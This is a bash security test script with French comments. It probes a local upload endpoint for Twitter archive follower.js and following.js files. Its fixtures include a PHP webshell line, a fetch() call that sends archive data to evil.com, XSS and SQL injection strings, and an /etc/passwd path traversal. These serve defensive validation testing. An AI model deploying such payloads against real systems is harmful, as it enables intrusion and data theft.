#!/bin/bash

# Enhanced script de test pour l'endpoint /api/upload/large-files
# Usage: AUTH_COOKIE="your_cookie" TEST_FILES_DIR="/path/to/twitter/archive" ./test-upload-enhanced.sh
# Tests de sécurité pour l'upload des fichiers follower.js et following.js d'archives Twitter
# Adapté pour la nouvelle architecture Redis avec polling du statut des jobs

API_URL="http://localhost:3000/api/upload/large-files"
STATUS_API_URL="http://localhost:3000/api/import-status"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
OUTPUT_FILE="upload_large_files_test_${TIMESTAMP}.txt"

echo "=== ENHANCED TESTING LARGE FILES UPLOAD API (Redis Architecture) ===" | tee "$OUTPUT_FILE"
echo "Date: $(date)" | tee -a "$OUTPUT_FILE"
echo "Target: $API_URL" | tee -a "$OUTPUT_FILE"
echo "Status API: $STATUS_API_URL" | tee -a "$OUTPUT_FILE"
echo

# Vérification des variables d'environnement
if [ -z "$AUTH_COOKIE" ]; then
  echo "Error: AUTH_COOKIE environment variable is not set" | tee -a "$OUTPUT_FILE"
  echo "Usage: AUTH_COOKIE=\"your_cookie\" ./test-upload-enhanced.sh" | tee -a "$OUTPUT_FILE"
  exit 1
fi

# Vérification optionnelle de TEST_FILES_DIR
TEST_FILES_AVAILABLE=false
if [ -n "$TEST_FILES_DIR" ] && [ -d "$TEST_FILES_DIR" ]; then
  TEST_FILES_AVAILABLE=true
  echo "Twitter archive directory found: $TEST_FILES_DIR" | tee -a "$OUTPUT_FILE"
else
  echo "Warning: TEST_FILES_DIR not set or invalid. Valid Twitter archive tests will be skipped." | tee -a "$OUTPUT_FILE"
  echo "Expected: directory containing follower.js and following.js from Twitter archive" | tee -a "$OUTPUT_FILE"
fi

# Variables pour le résumé
TEST_COUNT=0
RESULTS_SUMMARY=()
FAILED_TESTS=()
FAILED_DETAILS=()

# Créer un répertoire temporaire pour les fichiers de test
TMP_DIR=$(mktemp -d)
echo "Temporary directory created: $TMP_DIR" | tee -a "$OUTPUT_FILE"

# Fonction pour créer des fichiers de test malveillants
create_malicious_file() {
  local filename="$1"
  local content="$2"
  local filepath="$TMP_DIR/$filename"
  echo -e "$content" > "$filepath"
  echo "$filepath"
}

# Fonction pour polling du statut d'un job
poll_job_status() {
  local job_id="$1"
  local description="$2"
  local max_attempts=30  # 30 tentatives = 5 minutes max
  local attempt=0
  
  echo "  📊 Polling job status for: $description" | tee -a "$OUTPUT_FILE"
  echo "  Job ID: $job_id" | tee -a "$OUTPUT_FILE"
  
  while [ $attempt -lt $max_attempts ]; do
    attempt=$((attempt + 1))
    
    local status_response
    status_response=$(curl -s -X GET "$STATUS_API_URL/$job_id" \
      -H "Cookie: $AUTH_COOKIE" \
      -w "\nHTTP_CODE:%{http_code}\nTIME:%{time_total}" \
      --max-time 10 2>/dev/null)
    
    local http_code=$(echo "$status_response" | grep "HTTP_CODE:" | cut -d: -f2)
    local response_time=$(echo "$status_response" | grep "TIME:" | cut -d: -f2)
    local content=$(echo "$status_response" | grep -v "HTTP_CODE:" | grep -v "TIME:")
    
    if [ "$http_code" = "200" ]; then
      # Extraire le statut du job depuis la réponse JSON
      local job_status=$(echo "$content" | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
      local progress=$(echo "$content" | grep -o '"progress":[0-9]*' | cut -d':' -f2)
      local total_items=$(echo "$content" | grep -o '"totalItems":[0-9]*' | cut -d':' -f2)
      
      echo "    Attempt $attempt: Status=$job_status, Progress=$progress/$total_items (${response_time}s)" | tee -a "$OUTPUT_FILE"
      
      case "$job_status" in
        "completed")
          echo "  ✅ Job completed successfully!" | tee -a "$OUTPUT_FILE"
          return 0
          ;;
        "failed")
          echo "  ❌ Job failed!" | tee -a "$OUTPUT_FILE"
          echo "  Error details: $content" | tee -a "$OUTPUT_FILE"
          return 1
          ;;
        "pending"|"processing")
          # Continue polling
          sleep 10
          ;;
        *)
          echo "  ⚠️ Unknown job status: $job_status" | tee -a "$OUTPUT_FILE"
          sleep 10
          ;;
      esac
    else
      echo "    Attempt $attempt: HTTP $http_code - Status check failed (${response_time}s)" | tee -a "$OUTPUT_FILE"
      if [ $attempt -ge 3 ]; then
        echo "  ❌ Status polling failed after $attempt attempts" | tee -a "$OUTPUT_FILE"
        return 1
      fi
      sleep 5
    fi
  done
  
  echo "  ⏰ Job status polling timed out after $max_attempts attempts" | tee -a "$OUTPUT_FILE"
  return 1
}

# Fonction pour exécuter un test d'upload avec suivi du job
run_upload_test() {
  local description="$1"
  local expected="$2"
  local use_auth="$3"  # true ou false
  local curl_extra_args="$4"  # arguments curl supplémentaires
  local should_poll_status="$5"  # true si on doit suivre le statut du job
  
  TEST_COUNT=$((TEST_COUNT + 1))
  
  # Construire la commande curl
  local curl_cmd="curl -s -X POST \"$API_URL\""
  
  # Ajouter l'authentification si requise
  if [ "$use_auth" = "true" ]; then
    curl_cmd="$curl_cmd -H \"Cookie: $AUTH_COOKIE\""
  fi
  
  # Ajouter les arguments supplémentaires
  if [ -n "$curl_extra_args" ]; then
    curl_cmd="$curl_cmd $curl_extra_args"
  fi
  
  curl_cmd="$curl_cmd -w \"\nHTTP_CODE:%{http_code}\nTIME:%{time_total}\" --max-time 30"
  
  # Exécuter la requête
  local response
  response=$(eval "$curl_cmd" 2>/dev/null)
  
  # Extraire le code HTTP et le temps de réponse
  local http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
  local response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
  local content=$(echo "$response" | grep -v "HTTP_CODE:" | grep -v "TIME:")
  
  # Analyser la réponse
  local result_emoji=""
  local result_text=""
  local job_id=""
  
  if [ "$http_code" = "200" ]; then
    # Extraire le jobId de la réponse pour les uploads réussis
    job_id=$(echo "$content" | grep -o '"jobId":"[^"]*"' | cut -d'"' -f4)
    
    if echo "$content" | grep -qi "error\|failed"; then
      result_emoji="⚠️"
      result_text="UPLOAD REJETÉ MAIS CODE 200 - INCOHÉRENT"
    else
      result_emoji="✅"
      result_text="UPLOAD RÉUSSI - Job ID: $job_id"
      
      # Si demandé et qu'on a un job_id, suivre le statut
      if [ "$should_poll_status" = "true" ] && [ -n "$job_id" ]; then
        if poll_job_status "$job_id" "$description"; then
          result_text="$result_text - JOB COMPLETED"
        else
          result_text="$result_text - JOB FAILED/TIMEOUT"
          result_emoji="⚠️"
        fi
      fi
    fi
  elif [ "$http_code" = "400" ]; then
    result_emoji="✅"
    result_text="BAD REQUEST - VALIDATION FONCTIONNELLE"
  elif [ "$http_code" = "401" ]; then
    result_emoji="✅"
    result_text="NON AUTORISÉ - SÉCURITÉ FONCTIONNELLE"
  elif [ "$http_code" = "403" ]; then
    result_emoji="✅"
    result_text="ACCÈS INTERDIT - SÉCURITÉ FONCTIONNELLE"
  elif [ "$http_code" = "405" ]; then
    result_emoji="✅"
    result_text="MÉTHODE NON AUTORISÉE - SÉCURITÉ FONCTIONNELLE"
  elif [ "$http_code" = "413" ]; then
    result_emoji="✅"
    result_text="PAYLOAD TOO LARGE - LIMITE FONCTIONNELLE"
  elif [ "$http_code" = "429" ]; then
    result_emoji="✅"
    result_text="RATE LIMITED - PROTECTION FONCTIONNELLE"
  elif [ "$http_code" = "500" ]; then
    result_emoji="🚨"
    result_text="ERREUR SERVEUR - VULNÉRABILITÉ POTENTIELLE"
    FAILED_TESTS+=("$description")
    FAILED_DETAILS+=("HTTP 500: $content")
  else
    result_emoji="❓"
    result_text="RÉPONSE INATTENDUE (HTTP $http_code)"
    FAILED_TESTS+=("$description")
    FAILED_DETAILS+=("HTTP $http_code: $content")
  fi
  
  # Enregistrer le résultat
  RESULTS_SUMMARY+=("$result_emoji [$TEST_COUNT] $description: $result_text (${response_time}s)")
  
  # Afficher le résultat immédiatement
  echo "$result_emoji [$TEST_COUNT] $description" | tee -a "$OUTPUT_FILE"
  echo "  Expected: $expected" | tee -a "$OUTPUT_FILE"
  echo "  Result: $result_text (${response_time}s)" | tee -a "$OUTPUT_FILE"
  if [ -n "$job_id" ]; then
    echo "  Job ID: $job_id" | tee -a "$OUTPUT_FILE"
  fi
  echo "  Response: $content" | tee -a "$OUTPUT_FILE"
  echo | tee -a "$OUTPUT_FILE"
}

# Test de connectivité de base
echo "[0] Test de connectivité de base..." | tee -a "$OUTPUT_FILE"
run_upload_test "Test de connectivité sans données" "Devrait rejeter sans fichiers" "true" "" "false"

# Tests d'authentification
echo "[1] Tests d'authentification..." | tee -a "$OUTPUT_FILE"

# Créer un fichier simple pour les tests d'auth
simple_file=$(create_malicious_file "simple.txt" "test content")

run_upload_test "POST sans authentification" "Devrait être rejeté (401)" "false" "-F \"files=@$simple_file\"" "false"
run_upload_test "POST avec cookie invalide" "Devrait être rejeté (401)" "false" "-H \"Cookie: invalid=123\" -F \"files=@$simple_file\"" "false"

# Tests de validation de base
echo "[2] Tests de validation de base..." | tee -a "$OUTPUT_FILE"

run_upload_test "POST sans fichiers" "Devrait être rejeté (400)" "true" "" "false"
run_upload_test "POST avec champ vide" "Devrait être rejeté (400)" "true" "-F \"files=\"" "false"
run_upload_test "POST avec champ files mal formé" "Devrait être rejeté (400)" "true" "-F \"invalid_field=@$simple_file\"" "false"

# Tests de fichiers non-Twitter
echo "[3] Tests de fichiers non-Twitter..." | tee -a "$OUTPUT_FILE"

# Créer des fichiers qui ne sont PAS des archives Twitter
exe_file=$(create_malicious_file "follower.exe" "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00")
php_file=$(create_malicious_file "following.php" "<?php system(\$_GET['cmd']); ?>")
txt_file=$(create_malicious_file "follower.txt" "Not a JavaScript file")
html_file=$(create_malicious_file "following.html" "<script>alert(1)</script>")

run_upload_test "Upload follower.exe (malware)" "Devrait être rejeté (400/415)" "true" "-F \"files=@$exe_file;type=application/octet-stream\"" "false"
run_upload_test "Upload following.php (webshell)" "Devrait être rejeté (400/415)" "true" "-F \"files=@$php_file;type=application/x-php\"" "false"
run_upload_test "Upload follower.txt (mauvais type)" "Devrait être rejeté (400/415)" "true" "-F \"files=@$txt_file;type=text/plain\"" "false"
run_upload_test "Upload following.html (mauvais format)" "Devrait être rejeté (400/415)" "true" "-F \"files=@$html_file;type=text/html\"" "false"

# Tests de contenu malveillant dans des faux fichiers Twitter
echo "[4] Tests de contenu malveillant dans fichiers Twitter..." | tee -a "$OUTPUT_FILE"

# Faux follower.js avec contenu malveillant
fake_follower_js=$(create_malicious_file "follower.js" "
// Fake Twitter follower data with malicious payload
window.YTD.follower.part0 = [];
eval('alert(1)');
document.cookie = 'hacked=true';
fetch('https://evil.com/steal', {method: 'POST', body: JSON.stringify(window.YTD)});
")

# Faux following.js avec injection
fake_following_js=$(create_malicious_file "following.js" "
window.YTD.following.part0 = [
  {\"following\": {\"accountId\": \"123</script><script>alert(1)</script>\"}}
];
setTimeout(() => window.location = 'https://evil.com', 1000);
")

# Fichier avec structure Twitter mais contenu suspect
suspicious_follower=$(create_malicious_file "follower.js" "
window.YTD.follower.part0 = [
  {\"follower\": {\"accountId\": \"<script>alert('XSS')</script>\"}}
];
")

# Fichier avec données corrompues
corrupted_following=$(create_malicious_file "following.js" "
window.YTD.following.part0 = [
  {\"following\": null},
  {\"following\": {\"accountId\": \"/../../../../etc/passwd\"}}
];
")

run_upload_test "Faux follower.js avec eval() et XSS" "Devrait détecter contenu malveillant" "true" "-F \"files=@$fake_follower_js;type=application/javascript\"" "false"
run_upload_test "Faux following.js avec injection script" "Devrait détecter contenu malveillant" "true" "-F \"files=@$fake_following_js;type=application/javascript\"" "false"
run_upload_test "follower.js avec XSS dans données" "Devrait valider/échapper données" "true" "-F \"files=@$suspicious_follower;type=application/javascript\"" "false"
run_upload_test "following.js avec données corrompues" "Devrait valider structure" "true" "-F \"files=@$corrupted_following;type=application/javascript\"" "false"

# Tests de manipulation de noms de fichiers Twitter
echo "[5] Tests de manipulation de noms de fichiers Twitter..." | tee -a "$OUTPUT_FILE"

# Créer des fichiers avec noms malveillants mais qui ressemblent aux fichiers Twitter
wrong_name_file=$(create_malicious_file "followers.js" "window.YTD.follower.part0 = [];")  # nom incorrect
case_sensitive_file=$(create_malicious_file "Follower.js" "window.YTD.follower.part0 = [];")  # casse différente
unicode_file=$(create_malicious_file "fоllower.js" "window.YTD.follower.part0 = [];")  # caractère unicode similaire

run_upload_test "Nom incorrect: followers.js" "Devrait rejeter nom incorrect" "true" "-F \"files=@$wrong_name_file\"" "false"
run_upload_test "Casse différente: Follower.js" "Devrait valider casse" "true" "-F \"files=@$case_sensitive_file\"" "false"
run_upload_test "Caractère Unicode similaire" "Devrait détecter Unicode spoofing" "true" "-F \"files=@$unicode_file\"" "false"

# Tests de taille de fichiers Twitter réalistes
echo "[6] Tests de taille de fichiers Twitter..." | tee -a "$OUTPUT_FILE"

# Créer des fichiers de tailles réalistes pour Twitter
empty_follower=$(create_malicious_file "follower.js" "window.YTD.follower.part0 = [];")

# Fichier avec quelques followers (taille normale)
normal_follower=$(create_malicious_file "follower.js" "
window.YTD.follower.part0 = [
$(for i in {1..100}; do echo "  {\"follower\": {\"accountId\": \"user$i\", \"userLink\": \"https://twitter.com/user$i\"}},"; done)
];
")

# Fichier avec beaucoup de following (comme quelqu'un qui suit beaucoup de monde)
large_following=$(create_malicious_file "following.js" "
window.YTD.following.part0 = [
$(for i in {1..5000}; do echo "  {\"following\": {\"accountId\": \"followed$i\", \"userLink\": \"https://twitter.com/followed$i\"}},"; done)
];
")

run_upload_test "follower.js vide (nouveau compte)" "Devrait être accepté" "true" "-F \"files=@$empty_follower;type=application/javascript\"" "false"
run_upload_test "follower.js normal (100 followers)" "Devrait être accepté" "true" "-F \"files=@$normal_follower;type=application/javascript\"" "false"
run_upload_test "following.js volumineux (5k following)" "Devrait gérer gros fichier" "true" "-F \"files=@$large_following;type=application/javascript\"" "false"

# Tests de structure de données Twitter invalides
echo "[7] Tests de structure de données Twitter..." | tee -a "$OUTPUT_FILE"

# Fichier avec structure YTD incorrecte
wrong_structure=$(create_malicious_file "follower.js" "
var wrongData = {followers: []};
")

# Fichier avec window.YTD mais mauvaise propriété
wrong_property=$(create_malicious_file "following.js" "
window.YTD.wrongProperty = [];
")

# Fichier avec données Twitter mais format JSON invalide
invalid_json=$(create_malicious_file "follower.js" "
window.YTD.follower.part0 = [
  {\"follower\": {\"accountId\": \"valid\"}},
  {\"follower\": {\"accountId\": }},  // JSON invalide
];
")

# Fichier avec types de données incorrects
wrong_types=$(create_malicious_file "following.js" "
window.YTD.following.part0 = \"not an array\";
")

run_upload_test "Structure YTD incorrecte" "Devrait valider structure Twitter" "true" "-F \"files=@$wrong_structure;type=application/javascript\"" "false"
run_upload_test "Propriété YTD incorrecte" "Devrait valider propriétés attendues" "true" "-F \"files=@$wrong_property;type=application/javascript\"" "false"
run_upload_test "JSON invalide dans données Twitter" "Devrait valider JSON" "true" "-F \"files=@$invalid_json;type=application/javascript\"" "false"
run_upload_test "Types de données incorrects" "Devrait valider types" "true" "-F \"files=@$wrong_types;type=application/javascript\"" "false"

# Tests d'uploads de fichiers Twitter multiples
echo "[8] Tests d'uploads Twitter multiples..." | tee -a "$OUTPUT_FILE"

# Créer des fichiers Twitter valides
valid_follower=$(create_malicious_file "follower.js" "window.YTD.follower.part0 = [{\"follower\": {\"accountId\": \"123\", \"userLink\": \"https://twitter.com/user\"}}];")
valid_following=$(create_malicious_file "following.js" "window.YTD.following.part0 = [{\"following\": {\"accountId\": \"456\", \"userLink\": \"https://twitter.com/followed\"}}];")

# Fichier incorrect mélangé
mixed_file=$(create_malicious_file "other.js" "console.log('not twitter data');")

run_upload_test "Upload follower.js + following.js" "Devrait accepter les deux fichiers Twitter" "true" "-F \"files=@$valid_follower;type=application/javascript\" -F \"files=@$valid_following;type=application/javascript\"" "true"
run_upload_test "Upload seulement follower.js" "Devrait accepter un seul fichier" "true" "-F \"files=@$valid_follower;type=application/javascript\"" "false"
run_upload_test "Upload seulement following.js" "Devrait accepter un seul fichier" "true" "-F \"files=@$valid_following;type=application/javascript\"" "false"
run_upload_test "Upload Twitter + non-Twitter" "Devrait rejeter mix" "true" "-F \"files=@$valid_follower;type=application/javascript\" -F \"files=@$mixed_file;type=application/javascript\"" "false"

# Test de doublons
run_upload_test "Upload double follower.js" "Devrait gérer/rejeter doublons" "true" "-F \"files=@$valid_follower;type=application/javascript\" -F \"files=@$valid_follower;type=application/javascript\"" "false"

# Tests de données Twitter avec contenu malveillant
echo "[9] Tests de données Twitter avec injections..." | tee -a "$OUTPUT_FILE"

# Follower avec injection XSS dans accountId
xss_follower=$(create_malicious_file "follower.js" "
window.YTD.follower.part0 = [
  {\"follower\": {\"accountId\": \"<script>alert('XSS')</script>\", \"userLink\": \"https://twitter.com/evil\"}}
];
")

# Following avec injection SQL dans userLink
sql_following=$(create_malicious_file "following.js" "
window.YTD.following.part0 = [
  {\"following\": {\"accountId\": \"normaluser\", \"userLink\": \"'; DROP TABLE users; --\"}}
];
")

# Fichier avec liens malveillants
malicious_links=$(create_malicious_file "following.js" "
window.YTD.following.part0 = [
  {\"following\": {\"accountId\": \"phishing\", \"userLink\": \"https://evil-phishing-site.com/twitter-login\"}}
];
")

# Données avec caractères de contrôle
control_chars=$(create_malicious_file "follower.js" "
window.YTD.follower.part0 = [
  {\"follower\": {\"accountId\": \"user\\u0000\\u001f\\u007f\", \"userLink\": \"https://twitter.com/user\"}}
];
")

run_upload_test "Données follower avec XSS" "Devrait échapper/valider données" "true" "-F \"files=@$xss_follower;type=application/javascript\"" "false"
run_upload_test "Données following avec injection SQL" "Devrait échapper/valider données" "true" "-F \"files=@$sql_following;type=application/javascript\"" "false"
run_upload_test "Liens malveillants dans userLink" "Devrait valider domaines" "true" "-F \"files=@$malicious_links;type=application/javascript\"" "false"
run_upload_test "Caractères de contrôle dans données" "Devrait nettoyer caractères" "true" "-F \"files=@$control_chars;type=application/javascript\"" "false"

# Tests de données Twitter volumineuses et edge cases
echo "[10] Tests de données Twitter volumineuses..." | tee -a "$OUTPUT_FILE"

# Fichier avec un très grand nombre de followers (simulation compte populaire)
huge_followers=$(create_malicious_file "follower.js" "
window.YTD.follower.part0 = [
$(for i in {1..10000}; do echo "  {\"follower\": {\"accountId\": \"follower$i\", \"userLink\": \"https://twitter.com/follower$i\"}},"; done | head -n 9999)
  {\"follower\": {\"accountId\": \"follower10000\", \"userLink\": \"https://twitter.com/follower10000\"}}
];
")

# Fichier avec noms d'utilisateur très longs
long_usernames=$(create_malicious_file "following.js" "
window.YTD.following.part0 = [
  {\"following\": {\"accountId\": \"$(printf 'a%.0s' {1..1000})\", \"userLink\": \"https://twitter.com/$(printf 'a%.0s' {1..1000})\"}}
];
")

# Fichier avec structure répétitive (détection de pattern)
repetitive_data=$(create_malicious_file "follower.js" "
window.YTD.follower.part0 = [
$(for i in {1..1000}; do echo "  {\"follower\": {\"accountId\": \"bot\", \"userLink\": \"https://twitter.com/bot\"}},"; done | head -n 999)
  {\"follower\": {\"accountId\": \"bot\", \"userLink\": \"https://twitter.com/bot\"}}
];
")

run_upload_test "Très nombreux followers (10k)" "Devrait gérer ou limiter" "true" "-F \"files=@$huge_followers;type=application/javascript\"" "false"
run_upload_test "Noms d'utilisateur très longs" "Devrait valider longueur" "true" "-F \"files=@$long_usernames;type=application/javascript\"" "false"
run_upload_test "Données répétitives (détection bot)" "Devrait détecter patterns suspects" "true" "-F \"files=@$repetitive_data;type=application/javascript\"" "false"

# Tests de méthodes HTTP non autorisées
echo "[11] Tests de méthodes HTTP..." | tee -a "$OUTPUT_FILE"

# Test GET (les endpoints d'upload n'acceptent généralement que POST)
run_upload_test "GET au lieu de POST" "Devrait être rejeté (405)" "true" "-X GET" "false"
run_upload_test "PUT avec fichier" "Devrait être rejeté (405)" "true" "-X PUT -F \"files=@$simple_file\"" "false"
run_upload_test "DELETE" "Devrait être rejeté (405)" "true" "-X DELETE" "false"
run_upload_test "PATCH avec fichier" "Devrait être rejeté (405)" "true" "-X PATCH -F \"files=@$simple_file\"" "false"

# Tests avec fichiers Twitter valides (si disponibles)
echo "[12] Tests avec vraies archives Twitter..." | tee -a "$OUTPUT_FILE"

if [ "$TEST_FILES_AVAILABLE" = true ]; then
  # Chercher les fichiers Twitter dans l'archive
  FOLLOWER_FILE=$(find "$TEST_FILES_DIR" -name "follower.js" -type f | head -n 1)
  FOLLOWING_FILE=$(find "$TEST_FILES_DIR" -name "following.js" -type f | head -n 1)
  
  if [ -n "$FOLLOWER_FILE" ] && [ -n "$FOLLOWING_FILE" ]; then
    echo "[REAL] Tests avec fichiers Twitter réels..." | tee -a "$OUTPUT_FILE"
    
    # Test avec les vrais fichiers Twitter - AVEC POLLING DU STATUT
    run_upload_test "Upload fichiers Twitter réels (avec polling)" "Devrait réussir et traiter" "true" \
      "-F \"files=@$FOLLOWER_FILE\" -F \"files=@$FOLLOWING_FILE\"" "true"
    
    # Test avec un seul fichier
    run_upload_test "Upload un seul fichier Twitter" "Devrait réussir partiellement" "true" \
      "-F \"files=@$FOLLOWER_FILE\"" "false"
      
  else
    echo "Fichiers Twitter non trouvés dans $TEST_FILES_DIR" | tee -a "$OUTPUT_FILE"
  fi
else
  echo "Tests avec fichiers réels ignorés (TEST_FILES_DIR non configuré)" | tee -a "$OUTPUT_FILE"
fi

# Afficher le résumé des échecs SEULEMENT s'il y en a
if [ ${#FAILED_TESTS[@]} -gt 0 ]; then
    echo "RÉSUMÉ DES TESTS ÉCHOUÉS:" | tee -a "$OUTPUT_FILE"
    echo "=========================" | tee -a "$OUTPUT_FILE"
    for failure in "${FAILED_TESTS[@]}"; do
        echo "$failure" | tee -a "$OUTPUT_FILE"
    done
    
    echo | tee -a "$OUTPUT_FILE"
    echo "DÉTAILS COMPLETS DES TESTS ÉCHOUÉS:" | tee -a "$OUTPUT_FILE"
    echo "===================================" | tee -a "$OUTPUT_FILE"
    
    for detail in "${FAILED_DETAILS[@]}"; do
        echo "$detail" | tee -a "$OUTPUT_FILE"
        echo | tee -a "$OUTPUT_FILE"
    done
fi

echo
echo "=============================================="
echo "TEST UPLOAD LARGE FILES API TERMINÉ!"
echo "=============================================="
echo "Rapport complet sauvegardé: $OUTPUT_FILE"
echo
echo "📊 RÉSUMÉ RAPIDE DES TESTS:"
echo "$(printf '%s ' "${RESULTS_SUMMARY[@]}")"
echo
echo "🔍 LÉGENDE:"
echo "✅ = Sécurisé (validation fonctionnelle)"
echo "⚠️ = Attention (comportement inattendu)"
echo "🚨 = Vulnérabilité critique"
echo "❌ = Erreur technique"
echo "❓ = À analyser manuellement"
echo "⚡ = Rate limiting actif"

# Compter les résultats
SECURE_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "✅")
WARNING_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "⚠️")
CRITICAL_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "🚨")
ERROR_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "❌")
AMBIGUOUS_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "❓")
RATELIMIT_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "⚡")

echo
echo "📈 STATISTIQUES:"
echo "Tests sécurisés: $SECURE_COUNT/$TEST_COUNT"
echo "Tests avec attention: $WARNING_COUNT/$TEST_COUNT"
echo "Vulnérabilités critiques: $CRITICAL_COUNT/$TEST_COUNT"
echo "Erreurs techniques: $ERROR_COUNT/$TEST_COUNT"
echo "Résultats ambigus: $AMBIGUOUS_COUNT/$TEST_COUNT"
echo "Rate limiting actif: $RATELIMIT_COUNT/$TEST_COUNT"